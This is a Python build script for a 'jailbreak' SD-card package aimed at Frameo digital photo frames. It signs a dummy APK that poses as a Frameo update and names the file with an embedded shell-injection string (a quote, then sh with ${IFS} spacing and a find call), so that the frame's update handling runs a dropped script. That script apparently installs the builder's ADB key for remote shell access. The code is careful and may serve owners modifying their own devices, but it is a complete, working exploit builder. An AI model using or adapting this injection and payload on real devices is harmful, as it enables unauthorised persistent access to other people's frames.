#!/usr/bin/env python3
"""
Build a validated Frameo jailbreak SD package.

This builder only produces the SD-card payload. It does not touch a device.
The private ADB key stays on the host; only the public key is written to the
SD package.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
from datetime import datetime, timezone
from pathlib import Path
from zipfile import ZIP_DEFLATED, ZipFile

from package_verify import (VerificationError, assert_no_symlink_components,
                            read_json, validate_adb_blob, validate_manifest,
                            verify_package)

ROOT = Path(__file__).resolve().parent
TEMPLATES = ROOT / "templates"

PACKAGE = "net.frameo.frame"
FRAMEO_VERSION = "1.30.19"
FRAMEO_VERSION_CODE = 69880
PAYLOAD_VERSION_CODE = 69881
PAYLOAD_VERSION_NAME = "1.30.20"
PAYLOAD_NAME = "x';sh${IFS}$(find${IFS}${ANDROID_DATA%data}storage${IFS}-maxdepth${IFS}2${IFS}-name${IFS}p_frameo_jb);#.apk"
ADB_KEY_COMMENT = "frameo-jailbreak"
SCRIPT_NAME = "p_frameo_jb"
CONFIG_NAME = "frameo_utilities.config"
CONFIG_BODY = "auto_run=action_update_version\n"
FAT_FORBIDDEN = set('/\\:*?"<>|')
# These are rejected because the APK filename is created on FAT/exFAT.
# $ ( ) { } % ; # ' - _ and spaces are allowed by VFAT.
MAX_FAT_NAME = 255


def die(message: str) -> "NoReturn":
    print(f"error: {message}", file=sys.stderr)
    raise SystemExit(1)


def run(cmd: list[str], *, capture: bool = False) -> subprocess.CompletedProcess:
    hidden_options = {"--ks-pass", "--key-pass", "-storepass", "-keypass"}
    printable = " ".join("<redacted>" if i and cmd[i - 1] in hidden_options else str(c)
                         for i, c in enumerate(cmd))
    if not capture:
        print(f"+ {printable}")
    return subprocess.run(cmd, check=True, text=True, capture_output=capture)


def default_sdk() -> Path:
    candidates = [
        os.environ.get("ANDROID_SDK_ROOT"),
        os.environ.get("ANDROID_HOME"),
        str(Path.home() / "Library" / "Android" / "sdk"),
        str(Path.home() / "Android" / "Sdk"),
    ]
    for value in candidates:
        if value:
            p = Path(value)
            if p.is_dir():
                return p
    die("Android SDK not found; pass --android-sdk")


def version_key(path: Path) -> tuple:
    return tuple((0, int(x)) if x.isdigit() else (1, x)
                 for x in re.split(r"[.-]", path.name))


def find_build_tools(sdk: Path, override: str | None) -> Path:
    if override:
        bt = Path(override).expanduser().resolve()
        if not all((bt / name).is_file() and os.access(bt / name, os.X_OK)
                   for name in ("aapt2", "apksigner")):
            die(f"build-tools missing aapt2/apksigner: {bt}")
        return bt
    candidates = [p for p in (sdk / "build-tools").glob("*")
                  if all((p / name).is_file() and os.access(p / name, os.X_OK)
                         for name in ("aapt2", "apksigner"))]
    if not candidates:
        die(f"no usable build-tools under {sdk / 'build-tools'}")
    return sorted(candidates, key=version_key)[-1]


def find_platform(sdk: Path) -> Path:
    preferred = sdk / "platforms" / "android-34"
    if (preferred / "android.jar").is_file():
        return preferred
    candidates = [p for p in (sdk / "platforms").glob("android-*") if (p / "android.jar").is_file()]
    if not candidates:
        die(f"no Android platform android.jar under {sdk / 'platforms'}")
    return sorted(candidates, key=version_key)[-1]


def tool_version(cmd: list[str]) -> str:
    proc = subprocess.run(cmd, text=True, capture_output=True)
    text = (proc.stdout or proc.stderr or "").strip()
    return text.splitlines()[0] if text else ""


def sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for chunk in iter(lambda: f.read(1024 * 1024), b""):
            h.update(chunk)
    return h.hexdigest()


def write_text(path: Path, text: str, mode: int | None = None) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8", newline="\n") as f:
        f.write(text)
    if mode is not None:
        path.chmod(mode)


def validate_payload_name(name: str) -> None:
    if len(name.encode("utf-8")) > MAX_FAT_NAME:
        die(f"payload filename is longer than {MAX_FAT_NAME} bytes")
    bad = sorted({c for c in name if c in FAT_FORBIDDEN})
    if bad:
        die(f"payload filename contains FAT-forbidden characters: {bad!r}")
    if not name.endswith(".apk"):
        die("payload filename must end in .apk")
    if "/" in name:
        die("payload filename must not contain a slash")


def read_adb_pubkey(path: Path) -> tuple[str, str]:
    try:
        text = path.read_text(encoding="utf-8")
    except (OSError, UnicodeError) as exc:
        die(f"cannot read --adb-pubkey {path}: {exc}")
    lines = [line.strip() for line in text.splitlines() if line.strip()]
    if len(lines) != 1 or "\0" in text:
        die(f"--adb-pubkey must contain exactly one Android public key: {path}")
    blob = lines[0].split()[0]
    try:
        validate_adb_blob(blob)
    except VerificationError as exc:
        die(f"invalid --adb-pubkey: {exc}")
    return blob, f"{blob} {ADB_KEY_COMMENT}\n"


def validate_destination(out: Path, inputs: list[Path], *, force: bool) -> Path:
    """Validate the lexical path before resolving; never remove user directories."""
    try:
        out = assert_no_symlink_components(out)
    except VerificationError as exc:
        die(str(exc))
    out = out.resolve()
    if out == ROOT or out in ROOT.parents:
        die(f"output must not be the source directory or its ancestor: {out}")
    protected_dirs = [TEMPLATES, ROOT / ".git", ROOT / ".agents", ROOT / ".codex"]
    for protected in protected_dirs:
        protected = protected.resolve()
        if out == protected or protected in out.parents:
            die(f"output is inside a source/configuration input: {protected}")
    for path in inputs:
        path = path.expanduser().resolve()
        if path == out or out in path.parents:
            die(f"output contains a build input: {path}")
        if path.is_dir() and path in out.parents:
            die(f"output is inside a build input: {path}")
    if out.exists():
        if not out.is_dir():
            die(f"output is not a directory: {out}")
        if not force:
            die(f"output directory exists: {out} (use --force to replace)")
        try:
            if (out / "manifest.json").is_symlink():
                raise VerificationError("manifest is a symlink")
            validate_manifest(read_json(out / "manifest.json"))
            if any((out / name).is_symlink() or not (out / name).is_file()
                   for name in ("connect.sh", "frameo-jailbreak-sd.zip")) or (out / "sd").is_symlink() or not (out / "sd").is_dir():
                raise VerificationError("package layout is incomplete")
        except (VerificationError, OSError) as exc:
            die(f"--force only replaces recognized builder outputs: {out}: {exc}")
    return out


def resolve_keystore(keystore: Path | None) -> Path | None:
    """Check signing dependencies before creating even a staging directory."""
    path = keystore.expanduser().resolve() if keystore else Path.home() / ".android" / "debug.keystore"
    if path.is_file():
        with path.open("rb") as stream:
            if not stream.read(1):
                die(f"keystore is empty: {path}")
        return path
    if keystore:
        die(f"keystore not found: {path}")
    if not shutil.which("keytool"):
        die("keytool not found; create ~/.android/debug.keystore or pass --keystore")
    return None


def promote_output(stage: Path, out: Path) -> Path | None:
    """Keep the complete old output, including logs, and restore it on failure."""
    backup = None
    if out.exists():
        stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%S.%fZ")
        backup = out.with_name(f"{out.name}.previous-{stamp}")
        if backup.exists():
            raise FileExistsError(f"previous-output backup already exists: {backup}")
        out.rename(backup)
    try:
        stage.rename(out)
    except BaseException:
        if backup is not None:
            backup.rename(out)
        raise
    return backup


def ensure_keystore(out: Path, keystore: Path | None, ks_pass: str, key_pass: str) -> Path:
    if keystore:
        if not keystore.is_file():
            die(f"keystore not found: {keystore}")
        return keystore
    default = Path.home() / ".android" / "debug.keystore"
    if default.is_file():
        return default
    keytool = shutil.which("keytool")
    if not keytool:
        die("keytool not found; create ~/.android/debug.keystore or pass --keystore")
    generated = out / ".build" / "debug.keystore"
    generated.parent.mkdir(parents=True, exist_ok=True)
    print(f"generating throwaway APK signing key: {generated}")
    run(
        [
            keytool,
            "-genkeypair",
            "-keystore",
            str(generated),
            "-storepass",
            ks_pass,
            "-keypass",
            key_pass,
            "-alias",
            "androiddebugkey",
            "-keyalg",
            "RSA",
            "-keysize",
            "2048",
            "-validity",
            "10000",
            "-dname",
            "CN=Android Debug,O=Android,C=US",
        ],
        capture=True,
    )
    return generated


def build_apk(out: Path, build_tools: Path, platform: Path, keystore: Path,
              ks_pass: str, key_pass: str, version_code: int,
              manifest_template: str | None = None) -> tuple[Path, dict]:
    work = out / ".build"
    work.mkdir(parents=True, exist_ok=True)
    manifest = manifest_template if manifest_template is not None else (TEMPLATES / "AndroidManifest.xml").read_text(encoding="utf-8")
    manifest = re.sub(
        r'android:versionCode="\d+"',
        f'android:versionCode="{version_code}"',
        manifest,
    )
    manifest = re.sub(
        r'android:versionName="[^"]*"',
        f'android:versionName="{PAYLOAD_VERSION_NAME}"',
        manifest,
    )
    manifest_path = work / "AndroidManifest.xml"
    write_text(manifest_path, manifest)

    unsigned = work / "base.apk"
    signed = work / "payload.apk"
    android_jar = platform / "android.jar"
    run(
        [
            str(build_tools / "aapt2"),
            "link",
            "-o",
            str(unsigned),
            "-I",
            str(android_jar),
            "--manifest",
            str(manifest_path),
            "--min-sdk-version",
            "23",
            "--target-sdk-version",
            "34",
            "--version-code",
            str(version_code),
            "--version-name",
            PAYLOAD_VERSION_NAME,
        ]
    )
    run(
        [
            str(build_tools / "apksigner"),
            "sign",
            "--ks",
            str(keystore),
            "--ks-pass",
            f"pass:{ks_pass}",
            "--key-pass",
            f"pass:{key_pass}",
            "--out",
            str(signed),
            str(unsigned),
        ]
    )
    run([str(build_tools / "apksigner"), "verify", str(signed)], capture=True)
    badging = run([str(build_tools / "aapt2"), "dump", "badging", str(signed)], capture=True).stdout
    match = re.search(r"package: name='([^']+)' versionCode='([^']+)'", badging)
    if not match:
        die("could not parse aapt2 badging output")
    pkg, vc = match.group(1), match.group(2)
    if pkg != PACKAGE or vc != str(version_code):
        die(f"APK identity mismatch: package={pkg!r} versionCode={vc!r}")
    return signed, {
        "package": pkg,
        "version_code": vc,
        "version_name": PAYLOAD_VERSION_NAME,
        "sha256": sha256_file(signed),
    }


def make_manifest(out: Path, files: list[Path], payload_name: str,
                  apk_info: dict, keystore: Path, build_tools: Path) -> None:
    rel_files = {}
    for path in files:
        rel = str(path.relative_to(out))
        rel_files[rel] = {
            "sha256": sha256_file(path),
            "bytes": path.stat().st_size,
        }
    manifest = {
        "schema": "frameo-jailbreak-sd/v1",
        "built_at_utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "target": {
            "package": PACKAGE,
            "frameo_version": FRAMEO_VERSION,
            "frameo_version_code": FRAMEO_VERSION_CODE,
            "tested_device": "Frameo 159K (RK3326, Android 8.1, API 27)",
        },
        "payload": {
            "filename": payload_name,
            "config": CONFIG_BODY.strip(),
            "script": SCRIPT_NAME,
            "adb_key_comment": ADB_KEY_COMMENT,
            "version_code": apk_info["version_code"],
            "version_name": apk_info["version_name"],
            "apk_sha256": apk_info["sha256"],
        },
        "outputs": {
            "sd_zip": "frameo-jailbreak-sd.zip",
            "sd_dir": "sd",
            "connect_script": "connect.sh",
        },
        "files": rel_files,
        "tooling": {
            "build_tools": str(build_tools),
            "apk_keystore": str(keystore),
            "aapt2": tool_version([str(build_tools / "aapt2"), "version"]),
            "apksigner": tool_version([str(build_tools / "apksigner"), "version"]),
        },
        "security": {
            "private_key_included": False,
            "remote_greeting_included": False,
            "trigger_storage": "removable SD card only",
        },
        "notes": [
            "The config is removed by the first execution of p_frameo_jb.",
            "started/done markers make the payload one-shot.",
            "Per-attempt snapshots preserve current key bytes, metadata, ports and adbd state for rollback.",
            "adb_keys.before is retained clean recovery data; retries use fresh per-attempt snapshots.",
            "done records local verification; remote ADB authentication is checked separately by connect.sh.",
        ],
    }
    write_text(out / "manifest.json", json.dumps(manifest, indent=2, sort_keys=True) + "\n")


def main() -> int:
    parser = argparse.ArgumentParser(description="Build a Frameo jailbreak SD package")
    parser.add_argument("--adb-pubkey", required=True, type=Path,
                        help="Android ADB public key, usually ~/.android/adbkey.pub")
    parser.add_argument("--out", type=Path, default=ROOT / "out",
                        help="output directory (default: ./out)")
    parser.add_argument("--android-sdk", type=Path, default=None)
    parser.add_argument("--build-tools", default=None)
    parser.add_argument("--version-code", type=int, default=PAYLOAD_VERSION_CODE)
    parser.add_argument("--keystore", type=Path, default=None,
                        help="APK signing keystore (default: ~/.android/debug.keystore)")
    parser.add_argument("--ks-pass", default="android")
    parser.add_argument("--key-pass", default="android")
    parser.add_argument("--force", action="store_true",
                        help="replace a recognized output, retaining a timestamped previous-output backup")
    args = parser.parse_args()

    if not FRAMEO_VERSION_CODE < args.version_code <= 2100000000:
        die(f"--version-code must be greater than {FRAMEO_VERSION_CODE} and at most 2100000000")

    validate_payload_name(PAYLOAD_NAME)
    _, pub_line = read_adb_pubkey(args.adb_pubkey)

    sdk = args.android_sdk.expanduser().resolve() if args.android_sdk else default_sdk().resolve()
    build_tools = find_build_tools(sdk, args.build_tools).resolve()
    platform = find_platform(sdk).resolve()
    selected_keystore = resolve_keystore(args.keystore)
    template_names = ("AndroidManifest.xml", SCRIPT_NAME, "README-sd.txt", "connect.sh")
    # Read every template now, before creating directories or moving previous output.
    template_data = {}
    for name in template_names:
        # Preserve the connect template exactly, including its line endings.
        with (TEMPLATES / name).open(encoding="utf-8", newline="") as stream:
            template_data[name] = stream.read()
    if any(not body.strip() for body in template_data.values()):
        die("build templates must not be empty")
    inputs = [args.adb_pubkey, sdk, build_tools, platform, TEMPLATES,
              Path(__file__), ROOT / "package_verify.py", ROOT / "verify.sh"]
    if selected_keystore is not None:
        inputs.append(selected_keystore)
    out = validate_destination(args.out, inputs, force=args.force)
    out.parent.mkdir(parents=True, exist_ok=True)
    # A sibling keeps renames on one filesystem. Failed builds never touch out.
    stage = Path(tempfile.mkdtemp(prefix=f".{out.name}.staging-", dir=out.parent))
    try:
        build_package(stage, build_tools, platform, selected_keystore,
                      args.ks_pass, args.key_pass, args.version_code, pub_line, template_data)
        verify_package(stage, build_tools=build_tools)
        # Recheck after slow build tools, including ownership and symlink ancestors.
        validate_destination(out, inputs, force=args.force)
        backup = promote_output(stage, out)
    finally:
        if stage.exists():
            shutil.rmtree(stage)
    if backup is not None:
        print(f"previous output retained: {backup}")
    print(f"built and verified: {out}")
    print(f"  SD directory: {out / 'sd'}")
    print(f"  SD zip:       {out / 'frameo-jailbreak-sd.zip'}")
    print("next: copy the CONTENTS of sd/ to the root of a FAT/exFAT SD card.")
    print("      do not force-stop Frameo; insert the card or reboot with it inserted.")
    return 0


def build_package(out: Path, build_tools: Path, platform: Path,
                  selected_keystore: Path | None, ks_pass: str, key_pass: str,
                  version_code: int, pub_line: str, templates: dict[str, str]) -> None:
    keystore = ensure_keystore(out, selected_keystore, ks_pass, key_pass)
    apk, apk_info = build_apk(
        out, build_tools, platform, keystore,
        ks_pass, key_pass, version_code, templates["AndroidManifest.xml"],
    )

    sd = out / "sd"
    frameo_dir = sd / "Frameo_utilities"
    frameo_dir.mkdir(parents=True)
    write_text(frameo_dir / CONFIG_NAME, CONFIG_BODY)
    payload_path = frameo_dir / PAYLOAD_NAME
    shutil.copyfile(apk, payload_path)
    write_text(sd / SCRIPT_NAME, templates[SCRIPT_NAME], 0o755)
    write_text(sd / "adbkey", pub_line, 0o644)

    readme = templates["README-sd.txt"]
    readme = (
        readme.replace("{{BUILD_DATE}}", datetime.now(timezone.utc).isoformat(timespec="seconds"))
        .replace("{{PACKAGE}}", PACKAGE)
        .replace("{{VERSION_NAME}}", FRAMEO_VERSION)
        .replace("{{PAYLOAD_VERSION_CODE}}", str(version_code))
        .replace("{{PAYLOAD_NAME}}", PAYLOAD_NAME)
        .replace("{{ADB_KEY_COMMENT}}", ADB_KEY_COMMENT)
    )
    write_text(sd / "README.txt", readme, 0o644)

    write_text(out / "connect.sh", templates["connect.sh"], 0o755)

    zip_path = out / "frameo-jailbreak-sd.zip"
    with ZipFile(zip_path, "w", compression=ZIP_DEFLATED) as zf:
        for path in sorted(sd.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(sd).as_posix())

    # The temporary signing key and intermediate APKs do not belong in a release.
    recorded_keystore = selected_keystore or Path("ephemeral-signing-key-not-included")
    shutil.rmtree(out / ".build")
    files = [p for p in out.rglob("*") if p.is_file()]
    make_manifest(out, files, PAYLOAD_NAME, apk_info, recorded_keystore, build_tools)


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (OSError, UnicodeError, VerificationError, subprocess.CalledProcessError) as exc:
        die(str(exc))
